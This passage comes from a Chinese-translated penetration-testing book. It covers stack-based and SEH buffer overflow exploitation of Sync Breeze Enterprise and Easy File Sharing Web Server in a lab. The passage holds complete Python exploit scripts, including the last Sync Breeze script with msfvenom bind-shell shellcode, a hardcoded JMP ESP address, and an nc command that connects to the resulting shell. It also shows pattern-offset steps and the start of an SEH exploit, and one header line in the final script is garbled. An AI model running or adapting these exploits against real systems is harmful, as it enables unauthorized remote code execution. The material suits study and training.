buffer+=payload

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.129.128", 80))
s.send(buffer)
s.close()
```

让我们从`300`开始：

```
junk = 'A'*300
```

现在，将 Sync Breeze 附加到 Immunity Debugger（以管理员身份运行 Immunity Debugger）：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00366.jpeg)

确保将其附加到服务器（`syncbrs`），而不是客户端（`syncbrc`），然后点击运行程序。

现在，在我们的攻击机器上启动攻击代码：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00367.jpeg)

什么也没发生。让我们将模糊值增加到`700`：

```
junk = 'A'*700
```

然后重新运行攻击：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00368.gif)

再次什么也没发生。让我们将模糊值增加到`1000`：

```
junk = 'A'*1000
```

现在，重新运行攻击：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00369.gif)

成功了！让我们也看看寄存器：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00370.gif)

堆栈中有`A`字符：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00371.gif)

# 控制指令指针

好的，完美。让我们创建模式以获取 EIP 的偏移量：

```
$ cd /usr/share/metasploit-framework/tools/exploit/
$ ./pattern_create.rb -l 1000
```

现在，将垃圾值重置为新模式：

```
junk = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B'
```

关闭 Immunity Debugger，转到任务管理器|服务|服务...;现在，选择 Sync Breeze Enterprise，然后选择开始以重新启动服务：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00372.jpeg)

然后，确保程序正在运行并已连接：

！[](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00373.jpeg)

现在，再次以管理员身份运行 Immunity Debugger，附加`syncbrs`，并运行程序。

然后，从攻击机器上运行攻击：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00374.gif)

现在 EIP 值是`42306142`；让我们找到这个确切的 EIP 偏移量：

```
$ cd /usr/share/metasploit-framework/tools/exploit/
$ ./pattern_offset.rb -q 42306142 -l 1000
```

前述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00375.jpeg)

此外，我们可以在 Immunity Debugger 中使用`mona`插件：

```
!mona findmsp
```

前述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00376.gif)

让我们确认：

```
#!/usr/bin/python
import socket

junk = 'A'*780
eip = 'B'*4
pad = 'C'*(1000-780-4)

injection = junk + eip + pad

payload="username="+injection+"&password=A"
buffer="POST /login HTTP/1.1\r\n"
buffer+="Host: 192.168.129.128\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Referer: http://192.168.129.128/login\r\n"
buffer+="Connection: close\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: "+str(len(payload))+"\r\n"
buffer+="\r\n"
buffer+=payload

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.129.128", 80))
s.send(buffer)
s.close()
```

关闭 Immunity Debugger 并启动 Sync Breeze Enterprise 服务，并确保程序正在运行和连接。然后，启动 Immunity Debugger（作为管理员），附加`syncbrs`，并运行程序。

然后重新运行攻击：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00377.gif)

现在，我们可以控制指令指针：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00378.gif)

# 注入 shell 代码

因此，我们最终的注入应该是这样的：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00379.gif)

关闭 Immunity Debugger 并启动 Sync Breeze Enterprise 服务，并确保程序正在运行和连接。然后启动 Immunity Debugger，附加`syncbrs`，并运行程序。

好的，让我们找到`JMP ESP`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00380.jpeg)

然后，搜索`JMP ESP`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00381.gif)

我们得到了一个很长的列表；让我们随便选一个，`10090c83`：

我们选择了这个地址，因为这个位置对应应用程序（`libspp.dll`）是持久的。如果我们选择了与系统相关的地址（如`SHELL32.dll`或`USER32.dll`），那么该地址会在系统重新启动时发生变化。正如我们在上一章中看到的，它只在运行时起作用，在系统重新启动时将无效。

```
eip = '\x83\x0c\x09\x10'
```

让我们也设置 NOP sled：

```
nops = '\x90'*20
```

现在，让我们在端口`4321`上生成一个绑定 TCP shell 代码：

```
$ msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4321 -b '\x00\x26\x25\x0A\x2B\x3D\x0D' -f python
```

前述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00382.jpeg)

我们最终的攻击代码应该是这样的：

```
#!/usr/bin/python
import socket

buf = ""
buf += "\xda\xd8\xd9\x74\x24\xf4\xba\xc2\xd2\xd2\x3c\x5e\x29"
buf += "\xc9\xb1\x53\x31\x56\x17\x83\xee\xfc\x03\x94\xc1\x30"
buf += "\xc9\xe4\x0e\x36\x32\x14\xcf\x57\xba\xf1\xfe\x57\xd8"
buf += "\x72\x50\x68\xaa\xd6\x5d\x03\xfe\xc2\xd6\x61\xd7\xe5"
buf += "\x5f\xcf\x01\xc8\x60\x7c\x71\x4b\xe3\x7f\xa6\xab\xda"
buf += "\x4f\xbb\xaa\x1b\xad\x36\xfe\xf4\xb9\xe5\xee\x71\xf7"
buf += "\x35\x85\xca\x19\x3e\x7a\x9a\x18\x6f\x2d\x90\x42\xaf"
buf += "\xcc\x75\xff\xe6\xd6\x9a\x3a\xb0\x6d\x68\xb0\x43\xa7"
buf += "\xa0\x39\xef\x86\x0c\xc8\xf1\xcf\xab\x33\x84\x39\xc8"
buf += "\xce\x9f\xfe\xb2\x14\x15\xe4\x15\xde\x8d\xc0\xa4\x33"
buf += "\x4b\x83\xab\xf8\x1f\xcb\xaf\xff\xcc\x60\xcb\x74\xf3"
buf += "\xa6\x5d\xce\xd0\x62\x05\x94\x79\x33\xe3\x7b\x85\x23"
buf += "\x4c\x23\x23\x28\x61\x30\x5e\x73\xee\xf5\x53\x8b\xee"
buf += "\x91\xe4\xf8\xdc\x3e\x5f\x96\x6c\xb6\x79\x61\x92\xed"
buf += "\x3e\xfd\x6d\x0e\x3f\xd4\xa9\x5a\x6f\x4e\x1b\xe3\xe4"
buf += "\x8e\xa4\x36\x90\x86\x03\xe9\x87\x6b\xf3\x59\x08\xc3"
buf += "\x9c\xb3\x87\x3c\xbc\xbb\x4d\x55\x55\x46\x6e\x49\x47"
buf += "\xcf\x88\x03\x97\x86\x03\xbb\x55\xfd\x9b\x5c\xa5\xd7"
buf += "\xb3\xca\xee\x31\x03\xf5\xee\x17\x23\x61\x65\x74\xf7"
buf += "\x90\x7a\x51\x5f\xc5\xed\x2f\x0e\xa4\x8c\x30\x1b\x5e"
buf += "\x2c\xa2\xc0\x9e\x3b\xdf\x5e\xc9\x6c\x11\x97\x9f\x80"
buf += "\x08\x01\xbd\x58\xcc\x6a\x05\x87\x2d\x74\x84\x4a\x09"
buf += "\x52\x96\x92\x92\xde\xc2\x4a\xc5\x88\xbc\x2c\xbf\x7a"
buf += "\x16\xe7\x6c\xd5\xfe\x7e\x5f\xe6\x78\x7f\x8a\x90\x64"
buf += "\xce\x63\xe5\x9b\xff\xe3\xe1\xe4\x1d\x94\x0e\x3f\xa6"
buf += "\xa4\x44\x1d\x8f\x2c\x01\xf4\x8d\x30\xb2\x23\xd1\x4c"
buf += "\x31\xc1\xaa\xaa\x29\xa0\xaf\xf7\xed\x59\xc2\x68\x98"
buf += "\x5d\x71\x88\x89"

junk = 'A'*780
eip = '\x83\x0c\x09\x10'
nops = '\x90'*20

injection = junk + eip + nops + buf

payload="username="+injection+"&password=A"

buffer="POST /login HTTP/1.1\r\n"
buffer+="Host: 192.168.129.128\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r   2;n"
buffer+="Referer: http://192.168.129.128/login\r\n"
buffer+="Connection: close\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: "+str(len(payload))+"\r\n"
buffer+="\r\n"
buffer+=payload

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.129.128", 80))
s.send(buffer)
s.close()
```

准备好了！让我们关闭 Immunity Debugger 并启动 Sync Breeze Enterprise 服务；然后运行攻击。

现在，使用`nc`命令连接受害机：

```
$ nc 192.168.129.128 4321
```

前述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00383.gif)

成功了！

# 总结

在本章中，我们执行了与上一章相同的步骤，但是增加了与 HTTP 头部相关的一小部分。我希望你能在[www.exploit-db.com](http://www.exploit-db.com)中浏览，尝试找到任何缓冲区溢出，并像我们在这里做的那样制作自己的攻击。你练习得越多，就会越精通这种攻击！

在下一章中，我们将看一个完整的**结构化异常处理**（**SEH**）的实际例子。


# 第十一章：真实场景 - 第 3 部分

这是我们书中最后的实际部分。它采用了不同的方法，专注于基于**结构化异常处理**（**SEH**）的缓冲区溢出，也基于 HTTP 头部，但使用了 GET 请求。

# Easy File Sharing Web Server

我们的目标是 Easy File Sharing Web Server 7.2。您可以在[`www.exploit-db.com/exploits/39008/`](https://www.exploit-db.com/exploits/39008/)找到利用程序，并可以从[`www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe`](https://www.exploit-db.com/apps/60f3ff1f3cd34dec80fba130ea481f31-efssetup.exe)下载易受攻击的应用程序。

下载并安装应用程序；如果您在上一个实验中已经这样做了，那么我们需要关闭 Sync Breeze Enterprise 中的 Web 服务器，因为我们需要端口`80`。

打开 Sync Breeze Enterprise 并导航到 Tools | Advanced Options... | Server，确保在端口上启用 Web 服务器被禁用：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00384.jpeg)

点击保存以保存更改并关闭它。

打开 Easy File Sharing Web Server：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00385.jpeg)

点击 Try it!。当应用程序打开时，点击左上角的 Start：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00386.jpeg)

# Fuzzing

我们的参数是`GET`参数；请看以下截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00387.gif)

`GET`后面的`/`是我们的参数；让我们构建我们的 fuzzing 代码：

```
#!/usr/bin/python
import socket

junk = 

s = socket.socket()
s.connect(('192.168.129.128',80))
s.send("GET " + junk + " HTTP/1.0\r\n\r\n") 
s.close()
```

在受害机器上，以管理员身份启动 Immunity Debugger 并附加到`fsws`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00388.jpeg)

让我们从`1000`开始一个 fuzzing 值：

```
junk = 'A'*1000
```

然后运行利用程序：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00389.gif)

什么都没发生；让我们增加到`3000`：

```
junk = 'A'*3000
```

然后，再次运行利用程序：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00390.gif)

再次，一样；让我们尝试`5000`：

```
junk = 'A'*5000
```

然后，再次运行利用程序：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00391.gif)

还要在堆栈窗口中向下滚动；您将看到我们成功溢出了 SEH 和 nSEH：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00392.gif)

我们可以通过导航到 View | SEH chain 或（*Alt* + *S*）来确认：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00393.gif)

# 控制 SEH

现在，让我们尝试通过使用 Metasploit 创建模式来获取 SEH 的偏移量：

```
$ cd /usr/share/metasploit-framework/tools/exploit/
$ ./pattern_create.rb -l 5000
```

利用程序应该是这样的：

```
#!/usr/bin/python
import socket

junk = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk'

s = socket.socket()
s.connect(('192.168.129.128',80))
s.send("GET " + junk + " HTTP/1.0\r\n\r\n") 
s.close()
```

关闭 Immunity Debugger，重新运行 Easy File Sharing Web Server。以管理员身份运行 Immunity Debugger 并将其附加到`fsws`，然后运行利用程序。

应用程序崩溃了；让我们使用`mona`对我们的模式进行一些分析：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00394.gif)

```
!mona findmsp
```

上述命令的输出可以在以下截图中看到：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00395.gif)

所以 nSEH 的偏移应该在`4061`之后。

通过重新启动应用程序和 Immunity Debugger 来确认：

```
#!/usr/bin/python
import socket

junk = 'A'*4061
nSEH = 'B'*4
SEH = 'C'*4
pad = 'D'*(5000-4061-4-4)

injection = junk + nSEH + SEH + pad

s = socket.socket()
s.connect(('192.168.129.128',80))
s.send("GET " + injection + " HTTP/1.0\r\n\r\n") 
s.close()
```

现在，运行利用程序：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00396.gif)

按下*Shift* + *F9*来绕过异常：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00397.gif)

获取 SEH 链（*Alt* + *S*）：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00398.gif)

在堆栈中查找地址`04AD6FAC`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00399.gif)

我们的 B 位于下一个 SEH 中，我们的 C 位于 SEH 中。现在，我们对该应用程序的 SEH 有了控制。

# 注入 shellcode

这就是**shellcode**的样子：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/pentest-shcd/img/00400.gif)

